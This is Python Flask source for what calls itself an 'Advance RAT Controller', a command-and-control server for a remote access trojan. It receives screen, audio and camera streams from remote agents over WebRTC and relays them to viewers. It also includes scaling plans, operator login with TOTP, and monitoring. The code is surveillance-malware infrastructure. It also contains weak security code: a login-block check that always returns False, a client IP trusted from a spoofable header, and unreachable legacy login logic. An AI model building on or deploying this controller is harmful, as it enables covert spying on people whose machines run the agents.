# WebRTC Global State
WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}

# Production Scale Configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_sfu',  # Current: aiortc-based SFU
    'target_implementation': 'mediasoup',    # Target: mediasoup for production scale
    'migration_phase': 'planning',           # Current phase: planning
    'scalability_limits': {
        'aiorttc_max_viewers': 50,           # aiortc suitable for smaller setups
        'mediasoup_max_viewers': 1000,       # mediasoup for production scale
        'concurrent_agents': 100,            # Maximum concurrent agents
        'bandwidth_per_agent': 10000000      # 10 Mbps per agent
    },
    'performance_targets': {
        'target_latency': 100,               # 100ms target latency
        'target_bitrate': 5000000,           # 5 Mbps target bitrate
        'target_fps': 30,                    # 30 FPS target
        'max_packet_loss': 0.01              # 1% max packet loss
    }
}

# Security Configuration and Password Management
def generate_salt():
    """Generate a cryptographically secure salt"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """
    Hash a password using PBKDF2 with SHA-256
    
    Args:
        password (str): The password to hash
        salt (bytes, optional): Salt to use. If None, generates a new salt
    
    Returns:
        tuple: (hashed_password, salt) where both are base64 encoded strings
    """
    if salt is None:
        salt = generate_salt()
    elif isinstance(salt, str):
        salt = base64.b64decode(salt)
    
    # Use PBKDF2 with SHA-256 for secure password hashing
    import hashlib
    import hmac
    
    # Create the hash using PBKDF2
    hash_obj = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    # Return base64 encoded hash and salt
    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')

def verify_password(password, stored_hash, stored_salt):
    """
    Verify a password against a stored hash and salt
    
    Args:
        password (str): The password to verify
        stored_hash (str): The stored hash (base64 encoded)
        stored_salt (str): The stored salt (base64 encoded)
    
    Returns:
        bool: True if password matches, False otherwise
    """
    try:
        # Hash the provided password with the stored salt
        hash_obj, _ = hash_password(password, stored_salt)
        return hmac.compare_digest(hash_obj, stored_hash)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """
    Create a secure hash for a password

    Args:
        password (str): The password to hash

    Returns:
        tuple: (hash, salt) both base64 encoded
    """
    return hash_password(password)

def verify_admin_or_operator(password: str) -> bool:
    if ADMIN_PASSWORD_HASH and ADMIN_PASSWORD_SALT and verify_password(password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
        return True
    try:
        s = load_settings()
        op = (s.get('authentication', {})).get('operatorPassword') or ''
        if op:
            return hmac.compare_digest(op, password)
        return False
    except Exception:
        return False

ADMIN_PASSWORD_HASH = None
ADMIN_PASSWORD_SALT = None
try:
    if Config.ADMIN_PASSWORD:
        ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)
    else:
        print("ADMIN_PASSWORD not set; operatorPassword from settings.json will be used if configured")
except Exception as e:
    print(f"Error creating admin password hash: {e}")
    ADMIN_PASSWORD_HASH = None
    ADMIN_PASSWORD_SALT = None

# WebRTC Utility Functions
def create_webrtc_peer_connection(agent_id):
    """Create a WebRTC peer connection for an agent"""
    if not WEBRTC_AVAILABLE:
        return None
    
    try:
        ice_cfg = [RTCIceServer(**srv) if isinstance(srv, dict) else RTCIceServer(srv) for srv in WEBRTC_CONFIG['ice_servers']]
        pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_cfg))
        
        # Store the peer connection
        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
        
        # Set up event handlers
        @pc.on("connectionstatechange")
        async def on_connectionstatechange():
            print(f"WebRTC connection state for {agent_id}: {pc.connectionState}")
            if pc.connectionState == "failed":
                await pc.close()
                if agent_id in WEBRTC_PEER_CONNECTIONS:
                    del WEBRTC_PEER_CONNECTIONS[agent_id]
        
        @pc.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange():
            print(f"ICE connection state for {agent_id}: {pc.iceConnectionState}")
        
        @pc.on("icecandidate")
        def on_agent_icecandidate(candidate):
            try:
                agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
                if agent_sid and candidate:
                    emit('webrtc_ice_candidate', {
                        'agent_id': agent_id,
                        'candidate': {
                            'candidate': candidate.candidate,
                            'sdpMid': candidate.sdpMid,
                            'sdpMLineIndex': candidate.sdpMLineIndex
                        }
                    }, room=agent_sid)
            except Exception as e:
                print(f"Error emitting ICE candidate to agent {agent_id}: {e}")
        
        @pc.on("track")
        async def on_track(track):
            print(f"Received {track.kind} track from {agent_id}")
            if agent_id not in WEBRTC_STREAMS:
                WEBRTC_STREAMS[agent_id] = {}
            if track.kind not in WEBRTC_STREAMS[agent_id]:
                WEBRTC_STREAMS[agent_id][track.kind] = []
            try:
                WEBRTC_STREAMS[agent_id][track.kind].append(track)
            except Exception:
                WEBRTC_STREAMS[agent_id][track.kind] = [track]
            
            # Forward track to all viewers of this agent
            for viewer_id, viewer_data in WEBRTC_VIEWERS.items():
                if viewer_data['agent_id'] == agent_id:
                    try:
                        sender = viewer_data['pc'].addTrack(track)
                        if track.kind not in viewer_data['streams']:
                            viewer_data['streams'][track.kind] = []
                        viewer_data['streams'][track.kind].append(sender)
                    except Exception as e:
                        print(f"Error forwarding track to viewer {viewer_id}: {e}")
        
        return pc
    except Exception as e:
        print(f"Error creating WebRTC peer connection for {agent_id}: {e}")
        return None

def close_webrtc_connection(agent_id):
    """Close WebRTC connection for an agent"""
    if agent_id in WEBRTC_PEER_CONNECTIONS:
        try:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            # Properly handle async context
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # If loop is running, schedule the coroutine
                    future = asyncio.run_coroutine_threadsafe(pc.close(), loop)
                    future.result(timeout=5)  # Wait up to 5 seconds
                else:
                    # If no loop or not running, use asyncio.run
                    asyncio.run(pc.close())
            except (RuntimeError, asyncio.TimeoutError) as e:
                print(f"Warning: Could not cleanly close WebRTC connection for {agent_id}: {e}")
                # Force cleanup even if close fails
                pass
            finally:
                del WEBRTC_PEER_CONNECTIONS[agent_id]
        except Exception as e:
            print(f"Error closing WebRTC connection for {agent_id}: {e}")
    
    if agent_id in WEBRTC_STREAMS:
        del WEBRTC_STREAMS[agent_id]

def get_webrtc_stats(agent_id):
    """Get WebRTC statistics for an agent"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stats = {
            'connection_state': pc.connectionState,
            'ice_connection_state': pc.iceConnectionState,
            'ice_gathering_state': pc.iceGatheringState,
            'signaling_state': pc.signalingState,
            'local_description': pc.localDescription.sdp if pc.localDescription else None,
            'remote_description': pc.remoteDescription.sdp if pc.remoteDescription else None
        }
        return stats
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        return None

# Advanced WebRTC Performance Optimization Functions
def estimate_bandwidth(agent_id):
    """Estimate available bandwidth for an agent connection"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        # Get RTCStatsReport for bandwidth estimation
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(pc.getStats(), loop)
            stats_report = future.result(timeout=5)  # 5 second timeout
        except RuntimeError:
            # No event loop, run synchronously
            stats_report = asyncio.run(pc.getStats())
        
        bandwidth_stats = {
            'available_bandwidth': 0,
            'current_bitrate': 0,
            'packets_lost': 0,
            'rtt': 0,
            'jitter': 0
        }
        
        for stat in stats_report.values():
            if hasattr(stat, 'type'):
                if stat.type == 'inbound-rtp' and stat.mediaType == 'video':
                    bandwidth_stats['current_bitrate'] = getattr(stat, 'bytesReceived', 0) * 8 / 1000  # kbps
                    bandwidth_stats['packets_lost'] = getattr(stat, 'packetsLost', 0)
                elif stat.type == 'candidate-pair' and stat.state == 'succeeded':
                    bandwidth_stats['rtt'] = getattr(stat, 'currentRoundTripTime', 0) * 1000  # ms
                    bandwidth_stats['jitter'] = getattr(stat, 'jitter', 0) * 1000  # ms
        
        # Estimate available bandwidth based on current performance
        if bandwidth_stats['packets_lost'] > 0:
            # Reduce bitrate if packet loss detected
            bandwidth_stats['available_bandwidth'] = max(
                bandwidth_stats['current_bitrate'] * 0.8,
                WEBRTC_CONFIG['quality_levels']['low']['bitrate']
            )
        else:
            # Increase bitrate if no packet loss
            bandwidth_stats['available_bandwidth'] = min(
                bandwidth_stats['current_bitrate'] * 1.2,
                WEBRTC_CONFIG['quality_levels']['high']['bitrate']
            )
        
        return bandwidth_stats
        
    except Exception as e:
        print(f"Error estimating bandwidth for {agent_id}: {e}")
        return None

def adaptive_bitrate_control(agent_id, current_quality='auto'):
    """Implement adaptive bitrate control based on network conditions"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Determine optimal quality level based on bandwidth
        available_bandwidth = bandwidth_stats['available_bandwidth']
        current_bitrate = bandwidth_stats['current_bitrate']
        
        # Quality selection logic
        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
            optimal_quality = 'high'
        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
            optimal_quality = 'medium'
        else:
            optimal_quality = 'low'
        
        # Check if quality change is needed
        if current_quality != optimal_quality:
            print(f"Adaptive bitrate: Changing quality from {current_quality} to {optimal_quality}")
            print(f"Available bandwidth: {available_bandwidth:.0f} kbps, Current: {current_bitrate:.0f} kbps")
            
            # Emit quality change command to agent
            socketio.emit('webrtc_quality_change', {
                'agent_id': agent_id,
                'quality': optimal_quality,
                'bandwidth_stats': bandwidth_stats
            })
            
            return optimal_quality
        
        return current_quality
        
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        return None

def implement_frame_dropping(agent_id, load_threshold=0.8):
    """Implement intelligent frame dropping under high load"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return False
    
    try:
        # Check if psutil is available first
        try:
            import psutil
        except ImportError:
            print("psutil not available for load monitoring")
            return False
            
        # Get current system load
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        
        # Check if we're under high load
        if cpu_percent > (load_threshold * 100) or memory_percent > (load_threshold * 100):
            print(f"High load detected: CPU {cpu_percent:.1f}%, Memory {memory_percent:.1f}%")
            
            # Emit frame dropping command to agent
            socketio.emit('webrtc_frame_dropping', {
                'agent_id': agent_id,
                'enabled': True,
                'drop_ratio': 0.3,  # Drop 30% of frames
                'priority': 'keyframes_only'  # Keep keyframes, drop some intermediate frames
            })
            
            return True
        
        # Normal load - disable frame dropping
        socketio.emit('webrtc_frame_dropping', {
            'agent_id': agent_id,
            'enabled': False
        })
        
        return False
        
    except ImportError:
        print("psutil not available for load monitoring")
        return False
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        return False

def monitor_connection_quality(agent_id):
    """Monitor and log connection quality metrics"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Quality assessment
        quality_score = 100
        quality_issues = []
        
        # Check bitrate
        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
            quality_score -= 30
            quality_issues.append('Low bitrate')
        
        # Check latency
        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
            quality_score -= 25
            quality_issues.append('High latency')
        
        # Check packet loss
        if bandwidth_stats['packets_lost'] > 0:
            quality_score -= 20
            quality_issues.append('Packet loss detected')
        
        # Check jitter
        if bandwidth_stats['jitter'] > 50:  # 50ms threshold
            quality_score -= 15
            quality_issues.append('High jitter')
        
        # Log quality metrics
        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
            print(f"Connection Quality for {agent_id}:")
            print(f"  Quality Score: {quality_score}/100")
            print(f"  Current Bitrate: {bandwidth_stats['current_bitrate']:.0f} kbps")
            print(f"  RTT: {bandwidth_stats['rtt']:.1f} ms")
            print(f"  Jitter: {bandwidth_stats['jitter']:.1f} ms")
            print(f"  Packets Lost: {bandwidth_stats['packets_lost']}")
            if quality_issues:
                print(f"  Issues: {', '.join(quality_issues)}")
        
        return {
            'quality_score': quality_score,
            'bandwidth_stats': bandwidth_stats,
            'quality_issues': quality_issues,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
    except Exception as e:
        print(f"Error monitoring connection quality for {agent_id}: {e}")
        return None

def automatic_reconnection_logic(agent_id):
    """Implement automatic reconnection logic for failed connections"""
    if not WEBRTC_AVAILABLE:
        return False
    
    try:
        if agent_id in WEBRTC_PEER_CONNECTIONS:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            
            # Check connection state
            if pc.connectionState == 'failed' or pc.connectionState == 'disconnected':
                print(f"WebRTC connection failed for {agent_id}, attempting reconnection...")
                
                # Close failed connection
                try:
                    loop = asyncio.get_event_loop()
                    asyncio.run_coroutine_threadsafe(pc.close(), loop)
                except RuntimeError:
                    asyncio.run(pc.close())
                del WEBRTC_PEER_CONNECTIONS[agent_id]
                
                # Wait before reconnection attempt
                import time
                time.sleep(2)
                
                # Attempt reconnection
                new_pc = create_webrtc_peer_connection(agent_id)
                if new_pc:
                    print(f"Reconnection successful for {agent_id}")
                    return True
                else:
                    print(f"Reconnection failed for {agent_id}")
                    return False
        
        return True
        
    except Exception as e:
        print(f"Error in automatic reconnection for {agent_id}: {e}")
        return False

# Production Scale Monitoring and Migration Functions
def assess_production_readiness():
    """Assess current system's readiness for production scale"""
    try:
        current_agents = len(WEBRTC_PEER_CONNECTIONS)
        current_viewers = len(WEBRTC_VIEWERS)
        total_connections = current_agents + current_viewers
        
        readiness_report = {
            'current_implementation': PRODUCTION_SCALE['current_implementation'],
            'target_implementation': PRODUCTION_SCALE['target_implementation'],
            'migration_phase': PRODUCTION_SCALE['migration_phase'],
            'current_usage': {
                'agents': current_agents,
                'viewers': current_viewers,
                'total_connections': total_connections
            },
            'scalability_assessment': {
                'aiortc_limit_reached': current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'production_ready': current_viewers < PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'recommended_action': 'migrate_to_mediasoup' if current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] else 'continue_with_aiortc'
            },
            'performance_metrics': {},
            'recommendations': []
        }
        
        # Performance assessment
        if current_agents > 0:
            total_latency = 0
            total_bitrate = 0
            total_fps = 0
            agent_count = 0
            
            for agent_id in WEBRTC_PEER_CONNECTIONS:
                quality_data = monitor_connection_quality(agent_id)
                if quality_data:
                    total_latency += quality_data['bandwidth_stats']['rtt']
                    total_bitrate += quality_data['bandwidth_stats']['current_bitrate']
                    agent_count += 1
            
            if agent_count > 0:
                readiness_report['performance_metrics'] = {
                    'average_latency': total_latency / agent_count,
                    'average_bitrate': total_bitrate / agent_count,
                    'latency_target_met': (total_latency / agent_count) <= PRODUCTION_SCALE['performance_targets']['target_latency'],
                    'bitrate_target_met': (total_bitrate / agent_count) >= PRODUCTION_SCALE['performance_targets']['target_bitrate']
                }
        
        # Generate recommendations
        if readiness_report['scalability_assessment']['aiortc_limit_reached']:
            readiness_report['recommendations'].append('Immediate migration to mediasoup required for production scale')
        elif current_viewers > (PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] * 0.8):
            readiness_report['recommendations'].append('Approaching aiortc limits, plan mediasoup migration')
        
        if readiness_report['performance_metrics'].get('latency_target_met') == False:
            readiness_report['recommendations'].append('Optimize network configuration to meet latency targets')
        
        if readiness_report['performance_metrics'].get('bitrate_target_met') == False:
            readiness_report['recommendations'].append('Check bandwidth allocation and codec settings')
        
        return readiness_report
        
    except Exception as e:
        print(f"Error assessing production readiness: {e}")
        return None

def generate_mediasoup_migration_plan():
    """Generate detailed migration plan from aiortc to mediasoup"""
    try:
        migration_plan = {
            'current_state': {
                'implementation': 'aiortc_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'technology': 'Python + aiortc'
            },
            'target_state': {
                'implementation': 'mediasoup_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers'],
                'technology': 'Node.js + mediasoup'
            },
            'migration_phases': [
                {
                    'phase': 1,
                    'name': 'Parallel Implementation',
                    'description': 'Implement mediasoup alongside existing aiortc',
                    'duration': '2-3 weeks',
                    'tasks': [
                        'Set up Node.js mediasoup server',
                        'Implement mediasoup SFU logic',
                        'Create migration endpoints',
                        'Test with subset of viewers'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Gradual Migration',
                    'description': 'Migrate viewers from aiortc to mediasoup',
                    'duration': '1-2 weeks',
                    'tasks': [
                        'Implement viewer routing logic',
                        'Add load balancing between aiortc and mediasoup',
                        'Monitor performance during migration',
                        'Handle fallback scenarios'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Full Migration',
                    'description': 'Complete migration to mediasoup',
                    'duration': '1 week',
                    'tasks': [
                        'Migrate all remaining viewers',
                        'Decommission aiortc implementation',
                        'Performance validation',
                        'Documentation updates'
                    ]
                }
            ],
            'technical_requirements': [
                'Node.js 18+ runtime',
                'mediasoup library installation',
                'Redis for session management',
                'Load balancer configuration',
                'Monitoring and alerting setup'
            ],
            'estimated_effort': '4-6 weeks',
            'risk_assessment': 'Medium - requires careful testing and rollback plan'
        }
        
        return migration_plan
        
    except Exception as e:
        print(f"Error generating mediasoup migration plan: {e}")
        return None

def enhanced_webrtc_monitoring():
    """Enhanced WebRTC monitoring with production-scale metrics"""
    try:
        monitoring_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'system_overview': {
                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
                'total_viewers': len(WEBRTC_VIEWERS),
                'total_connections': len(WEBRTC_PEER_CONNECTIONS) + len(WEBRTC_VIEWERS),
                'system_load': {}
            },
            'performance_metrics': {},
            'quality_metrics': {},
            'scalability_metrics': {},
            'alerts': []
        }
        
        # System load monitoring
        try:
            import psutil
            monitoring_data['system_overview']['system_load'] = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'network_io': psutil.net_io_counters()._asdict()
            }
        except ImportError:
            monitoring_data['system_overview']['system_load'] = {'error': 'psutil not available'}
        
        # Performance metrics per agent
        for agent_id in WEBRTC_PEER_CONNECTIONS:
            quality_data = monitor_connection_quality(agent_id)
            if quality_data:
                monitoring_data['performance_metrics'][agent_id] = quality_data
        
        # Quality assessment
        if monitoring_data['performance_metrics']:
            total_quality_score = sum(data['quality_score'] for data in monitoring_data['performance_metrics'].values())
            avg_quality_score = total_quality_score / len(monitoring_data['performance_metrics'])
            
            monitoring_data['quality_metrics'] = {
                'average_quality_score': avg_quality_score,
                'quality_distribution': {
                    'excellent': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] >= 90]),
                    'good': len([s for s in monitoring_data['performance_metrics'].values() if 70 <= s['quality_score'] < 90]),
                    'fair': len([s for s in monitoring_data['performance_metrics'].values() if 50 <= s['quality_score'] < 70]),
                    'poor': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] < 50])
                }
            }
        
        # Scalability assessment
        current_viewers = len(WEBRTC_VIEWERS)
        aiortc_limit = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
        
        monitoring_data['scalability_metrics'] = {
            'current_viewer_count': current_viewers,
            'aiortc_limit': aiortc_limit,
            'utilization_percentage': (current_viewers / aiortc_limit) * 100,
            'approaching_limit': current_viewers >= (aiortc_limit * 0.8),
            'limit_reached': current_viewers >= aiortc_limit
        }
        
        # Generate alerts
        if monitoring_data['scalability_metrics']['limit_reached']:
            monitoring_data['alerts'].append({
                'level': 'CRITICAL',
                'message': 'aiortc viewer limit reached - immediate migration required',
                'action': 'migrate_to_mediasoup'
            })
        elif monitoring_data['scalability_metrics']['approaching_limit']:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Approaching aiortc viewer limit - plan migration',
                'action': 'plan_migration'
            })
        
        # Quality alerts
        if monitoring_data['quality_metrics'].get('average_quality_score', 100) < 70:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Average connection quality below threshold',
                'action': 'investigate_network_issues'
            })
        
        return monitoring_data
        
    except Exception as e:
        print(f"Error in enhanced WebRTC monitoring: {e}")
        return None

# Session management and security tracking
LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP

def get_client_ip():
    xff = request.headers.get('X-Forwarded-For')
    if xff:
        ip = xff.split(',')[0].strip()
        if ip:
            return ip
    return request.environ.get('REMOTE_ADDR', request.remote_addr) or '0.0.0.0'

def is_authenticated():
    """Check if user is authenticated and session is valid"""
    # Debug session
    print(f"DEBUG: is_authenticated called. Session: {session.get('authenticated')}, Path: {request.path}")

    # Check session
    if not session.get('authenticated', False):
        print("DEBUG: Not authenticated in session")
        return False
    
    # Enforce TOTP when required
    try:
        cfg = load_settings().get('authentication', {})
        secret = cfg.get('totpSecret')
        require_two_factor = bool(cfg.get('requireTwoFactor'))
        trusted_ok = False
        try:
            token = request.cookies.get('trusted_device')
            if token:
                h = hashlib.sha256(token.encode()).hexdigest()
                lst = cfg.get('trustedDevices') or []
                trusted_ok = h in lst
        except Exception:
            trusted_ok = False
        if require_two_factor:
            if not secret:
                return False
            if not session.get('otp_verified', False) and not trusted_ok:
                return False
    except Exception as _e:
        print(f"TOTP check error: {_e}")
        return False
    
    # Check session timeout
    login_time = session.get('login_time')
    if login_time:
        try:
            # Handle both formats: with and without 'Z'
            if login_time.endswith('Z'):
                login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
            else:
                login_datetime = datetime.datetime.fromisoformat(login_time)
                # Assume UTC if no timezone info
                if login_datetime.tzinfo is None:
                    login_datetime = login_datetime.replace(tzinfo=datetime.timezone.utc)
            
            current_time = datetime.datetime.now(datetime.timezone.utc)
            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
                session.clear()
                return False
        except Exception as e:
            print(f"Session authentication error: {e}")
            session.clear()
            return False
    
    return True

def is_ip_blocked(ip):
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    if ip in LOGIN_ATTEMPTS:
        attempts, _ = LOGIN_ATTEMPTS[ip]
        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
    else:
        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP after successful login"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication for routes"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if is_authenticated():
        return redirect(url_for('dashboard'))
        
    # Serve React app for login page too
    # This allows the React app to handle the /login route with its own UI
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            runtime_overrides = (
                "<script>"
                "window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;"
                "window.__API_URL__ = window.__SOCKET_URL__;"
                "</script>"
            )
            fav_png = '<link rel="icon" href="/favicon.png" type="image/png" sizes="64x64" />'
            fav_ico = '<link rel="shortcut icon" href="/neural.ico" type="image/x-icon" />'
            fav_tags = fav_png + fav_ico
            if "</head>" in index_html:
                if fav_png not in index_html and fav_ico not in index_html:
                    index_html = index_html.replace("<head>", "<head>" + fav_tags)
                modified = index_html.replace("</head>", runtime_overrides + "</head>")
            else:
                modified = fav_tags + runtime_overrides + index_html
            return Response(modified, mimetype='text/html')
        else:
            # Fallback for when build is missing - just redirect to dashboard logic which handles errors
            return redirect(url_for('dashboard'))
    except Exception as e:
        print(f"Failed to serve React login page: {e}")
        return redirect(url_for('dashboard'))
    
    # Legacy controller-rendered login form is intentionally disabled.
    # The React app at /agent-controller ui v2.1/ handles the login UI now.
    # You can re-enable the server-side form by moving or removing the early returns above.
    
    # Check if IP is blocked
    if is_ip_blocked(client_ip):
        remaining_time = Config.LOGIN_TIMEOUT
        if client_ip in LOGIN_ATTEMPTS:
            remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
        return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login Blocked</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --accent-red: #ff4757;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                text-align: center;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 20px;
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: var(--accent-red);
                border: 1px solid var(--accent-red);
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
            </div>
            
            <div class="error-message">
                <h3>🔒 Access Temporarily Blocked</h3>
                <p>Too many failed login attempts detected.</p>
                <p>Please wait before trying again.</p>
            </div>
            
            <a href="/login" class="retry-btn">Try Again</a>
        </div>
    </body>
    </html>
    ''')
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        otp_raw = request.form.get('otp', '') or request.form.get('totp', '')
        otp = re.sub(r'\D', '', str(otp_raw or ''))[:6]
        
        if verify_admin_or_operator(password):
            s = load_settings()
            auth = s.get('authentication', {})
            secret = auth.get('totpSecret')
            issuer = auth.get('issuer', 'Neural Control Hub')
            require_two_factor = bool(auth.get('requireTwoFactor'))
            if require_two_factor and (not secret or not auth.get('totpEnrolled')):
                secret = get_or_create_totp_secret()
                uri = pyotp.TOTP(secret).provisioning_uri(name='Authentication', issuer_name=issuer)
                img = qrcode.make(uri)
                buf = io.BytesIO()
                img.save(buf, format='PNG')
                qr_b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                flash('Two-factor authentication setup required. Scan the QR and enter OTP.', 'error')
                return render_template_string(login_template, qr_b64=qr_b64, secret=secret, require_totp=True, enrolled=False, issuer=issuer)
            if require_two_factor:
                if not otp:
                    flash('OTP required. Please enter the 6-digit code.', 'error')
                    return render_template_string(login_template, qr_b64=None, secret=None, require_totp=True, enrolled=True, issuer=issuer)
                if not verify_totp_code(secret, str(otp), window=2):
                    record_failed_login(client_ip)
                    flash('Invalid OTP. Please try again.', 'error')
                    return render_template_string(login_template, qr_b64=None, secret=None, require_totp=True, enrolled=True, issuer=issuer)
            # Successful password + OTP
            clear_login_attempts(client_ip)
            session['authenticated'] = True
            session['otp_verified'] = True if require_two_factor else False
            session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            session['login_ip'] = client_ip
            try:
                if require_two_factor:
                    auth['totpEnrolled'] = True
                s['authentication'] = auth
                save_settings(s)
            except Exception:
                pass
            return redirect(url_for('dashboard'))
        else:
            # Failed login
            record_failed_login(client_ip)
            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
